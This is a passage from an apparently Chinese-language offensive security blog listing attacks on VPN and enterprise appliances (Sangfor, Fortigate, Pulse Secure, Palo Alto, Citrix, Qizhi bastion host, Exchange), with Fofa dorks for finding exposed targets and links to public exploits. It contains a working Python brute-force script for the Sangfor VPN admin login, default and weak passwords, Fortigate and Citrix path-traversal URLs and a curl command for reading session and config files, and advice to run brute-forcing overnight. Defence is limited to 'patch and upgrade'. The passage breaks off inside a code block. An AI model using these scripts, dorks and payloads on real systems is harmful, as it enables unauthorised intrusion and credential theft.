&lt;p&gt;&lt;code&gt;app=&amp;quot;深信服-SSL-VPN&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区
&lt;a class=&#34;link&#34; href=&#34;https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;amp;tid=20633&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;此处存疑, 时间问题没有测试&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#encoding=utf8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import requests
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import hashlib
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import urllib3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;urllib3.disable_warnings()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import re
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;session = requests.session()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def SanForLogin(target, password, username=&amp;#34;admin&amp;#34;):
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    burp0_url = target +&amp;#34;/cgi-bin/login.cgi?rnd=&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    burp0_headers = {&amp;#34;User-Agent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r1 = session.get(burp0_url, verify=False)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    sid = r1.cookies[&amp;#34;sinfor_session_id&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Epassword = hashlib.sha1(password+sid).hexdigest()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    burp0_data = {&amp;#34;user&amp;#34;: username, &amp;#34;password&amp;#34;: Epassword, &amp;#34;logintime&amp;#34;: &amp;#34;2&amp;#34;, &amp;#34;program&amp;#34;: &amp;#34;3&amp;#34;, &amp;#34;language&amp;#34;: &amp;#34;zh_CN&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r2 = session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r2.encoding=&amp;#34;UTF-8&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    if r2.status_code==200 and &amp;#34;&amp;lt;TITLE&amp;gt;Loading...&amp;lt;/TITLE&amp;gt;&amp;#34; in r2.text:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print(&amp;#34;Success! admin password is &amp;#34;, password)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print(r2.cookies[&amp;#34;sinfor_session_id&amp;#34;])
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return password
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    else:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        for x in re.findall(&amp;#34;var loginInfo = \&amp;#34;.*?\&amp;#34;&amp;#34;, r2.text):
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            print(x)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            if &amp;#34;IP&amp;#34; in x:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                print(&amp;#34;IP lock wait for 5 mins&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                time.sleep(305)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SanForLogin(&amp;#34;https://xxxxxxxxxxx/&amp;#34;, &amp;#34;admin&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多&lt;/p&gt;
&lt;p&gt;国外APT组织应该也批量爆破了一波&lt;/p&gt;
&lt;p&gt;加密的密码也就是 &lt;code&gt;sha1(password+sid)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin/123456/Sangfor/Sangfor@123&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能&lt;/p&gt;
&lt;p&gt;3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧&lt;/p&gt;
&lt;p&gt;深信服SSL VPN外置数据中心敏感信息泄漏&amp;amp;SQL注入漏洞可导致getshell – 体验盒子 – 关注网络安全
&lt;a class=&#34;link&#34; href=&#34;https://www.uedbox.com/post/31092/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.uedbox.com/post/31092/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;fortigate-ssl-vpn-文件读取远程代码执行&#34;&gt;Fortigate SSL VPN 文件读取/远程代码执行&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Fortigate SSL VPN 在全球用户量巨大, 去年橘子哥发现了文件读取和远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Fortigate SSL VPN&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Fortigate&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;4tinet2095866&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;Fortigate&amp;quot; &amp;amp;&amp;amp; port=10443&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Orange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPN
&lt;a class=&#34;link&#34; href=&#34;https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;密码读取&lt;/p&gt;
&lt;p&gt;milo2012/CVE-2018-13379: CVE-2018-13379
&lt;a class=&#34;link&#34; href=&#34;https://github.com/milo2012/CVE-2018-13379&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/milo2012/CVE-2018-13379&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;任意密码重置, 这肯定是个后门&lt;/p&gt;
&lt;p&gt;milo2012/CVE-2018-13382: CVE-2018-13382
&lt;a class=&#34;link&#34; href=&#34;https://github.com/milo2012/CVE-2018-13382&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/milo2012/CVE-2018-13382&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.文件读取的路径构造&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://xxxxxx:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如下padding可以构造出来任意文件读取, 可以读取其他文件, 注意这个系统好像没有/etc/passwd&lt;/p&gt;
&lt;p&gt;&lt;code&gt;print(&amp;quot;/../../../../&amp;quot;+(raw_input().rjust(35, &#39;/&#39;)))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.寻找魔术数字&lt;/p&gt;
&lt;p&gt;虽然当时橘子哥没有公开魔术数字, 但是当时随手分析了一下下面这个启动文件, 搜索一下magic就找到 4tinet2095866,&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://xxxxxxxx:10443/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;后来发现这个字符串在js里面也有, 直接从前台分析也可以获得&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://xxxxx:10443/sslvpn/js/login.js?q=5f9a6877fd1f78da768239aae6e739c2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;pulse-secure-ssl-vpn远程代码执行漏洞&#34;&gt;Pulse Secure SSL VPN远程代码执行漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Pulse Secure SSL VPN 在全球用户量巨大, 去年橘子哥发现了很多漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Pulse Secure SSL VPN&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Pulse Secure SSL VPN&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;PulseSecure-SSL-VPN&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Pulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台
&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/185773&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.anquanke.com/post/id/185773&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;projectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)
&lt;a class=&#34;link&#34; href=&#34;https://github.com/projectzeroindia/CVE-2019-11510&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/projectzeroindia/CVE-2019-11510&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connect
&lt;a class=&#34;link&#34; href=&#34;https://github.com/0xDezzy/CVE-2019-11539&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/0xDezzy/CVE-2019-11539&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;palo-alto-globalprotect-vpn远程代码执行漏洞&#34;&gt;Palo Alto GlobalProtect VPN远程代码执行漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Palo Alto GlobalProtect 在全球用户量巨大, 去年橘子哥发现了很多漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Palo Alto GlobalProtect&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GlobalProtect Portal&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;PaloAlto-GlobalProtect&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Orange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!
&lt;a class=&#34;link&#34; href=&#34;https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Palo Alto GlobalProtect上的PreAuth RCE – 渗透测试中心 – 博客园
&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/backlion/p/11209054.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cnblogs.com/backlion/p/11209054.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;securifera/CVE-2019-1579
&lt;a class=&#34;link&#34; href=&#34;https://github.com/securifera/CVE-2019-1579&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/securifera/CVE-2019-1579&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.这个扫描的话可以判断&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/global-protect/portal/css/login.css&lt;/code&gt;
&lt;code&gt;/images/logo_pan_158.gif&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Last-Modified&lt;/code&gt; 是否早于于2018年&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl -s -I https://sslvpn/global-protect/portal/css/login.css | grep Last-Modified&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;h2 id=&#34;citrix-gatewayadc-远程代码执行漏洞-cve-2019-19781&#34;&gt;Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Citrix Gateway/ADC 在全球拥有很多的大客户. 这也是个很经典的灯下黑漏洞(后门)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Citrix Gateway/ADC&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Citrix Gateway/ADC&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Citrix-Netscaler&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Citrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台
&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/news/232752.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/news/232752.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.
&lt;a class=&#34;link&#34; href=&#34;https://github.com/trustedsec/cve-2019-19781&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/trustedsec/cve-2019-19781&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.通过以下命令可以快速断定&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is --insecure&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里部分版本不需要进行&lt;code&gt;../&lt;/code&gt;跳转也可以, 具体原因没有分析&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;p&gt;3.暂时屏蔽未授权用户对/vpns/路径的访问&lt;/p&gt;
&lt;h2 id=&#34;齐治堡垒机相关漏洞&#34;&gt;齐治堡垒机相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;齐治堡垒机是国内使用比较多的堡垒机产品, 后端使用PHP编写&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
齐治堡垒机&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;shterm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;shterm-堡垒机&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;审计某系统从解密到GetShell – 云+社区 – 腾讯云
&lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/developer/article/1448700&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://cloud.tencent.com/developer/article/1448700&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记
&lt;a class=&#34;link&#34; href=&#34;http://kfbiji.com/article/65b98114903248eb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://kfbiji.com/article/65b98114903248eb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记
&lt;a class=&#34;link&#34; href=&#34;http://kfbiji.com/article/65b98114903248eb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://kfbiji.com/article/65b98114903248eb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.齐治堡垒机默认口令:&lt;code&gt;shterm/shterm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.普通用户获取堡垒机权限, 登录之后可尝试命令注入&lt;/p&gt;
&lt;p&gt;如果有类似chrome的应用可以直接使用&lt;code&gt;ctrl+o&lt;/code&gt;打开窗口, 然后新建bat, 起一个cmd或者其他的程序&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.升级到最新版&lt;/p&gt;
&lt;p&gt;3.做好权限控制&lt;/p&gt;
&lt;h2 id=&#34;exchange-相关漏洞&#34;&gt;Exchange 相关漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Exchange 是企业用量很大的邮件服务器, 包括一个登录后用户伪造(CVE-2018-8581, 利用难度高)和登录后反序列化漏洞(CVE-2020-0688, 利用难度低)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Exchange&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Exchange&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;outlook&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Microsoft-Exchange&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;微软Exchange爆出0day漏洞, 来看POC和技术细节 – FreeBuf互联网安全新媒体平台
&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/vuls/195162.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.freebuf.com/vuls/195162.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析
&lt;a class=&#34;link&#34; href=&#34;https://paper.seebug.org/804/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://paper.seebug.org/804/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688] – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/7299&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/7299&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Ridter/Exchange2domain: CVE-2018-8581
&lt;a class=&#34;link&#34; href=&#34;https://github.com/Ridter/Exchange2domain&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Ridter/Exchange2domain&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ridter/cve-2020-0688: cve-2020-0688
&lt;a class=&#34;link&#34; href=&#34;https://github.com/Ridter/cve-2020-0688&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Ridter/cve-2020-0688&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters
&lt;a class=&#34;link&#34; href=&#34;https://github.com/pwntester/ysoserial.net&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/pwntester/ysoserial.net&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.寻找企业的Exchange有个技巧&lt;/p&gt;
&lt;p&gt;除了访问以下域名或者直接查找 &lt;code&gt;DNS MX&lt;/code&gt; 记录&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
